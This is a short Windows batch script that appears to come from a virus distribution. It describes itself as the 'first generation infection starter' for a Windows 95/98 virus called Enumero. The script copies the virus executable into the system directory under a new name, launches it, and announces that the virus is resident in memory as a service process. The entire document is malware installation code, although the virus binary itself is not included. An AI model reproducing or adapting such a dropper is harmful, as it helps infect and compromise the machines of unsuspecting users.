@echo off
ECHO ** This is the Windows95/98 1st generation infection starter **
ECHO enumero must have a copy of itself in your system directory since
ECHO this is first generation. Infected hosts will create this file.
copy enum.exe enum.1st
copy enum.1st %windir%\system\enumero.exe
%windir%\system\enumero.exe
ECHO Enumero in memory as a service process! 
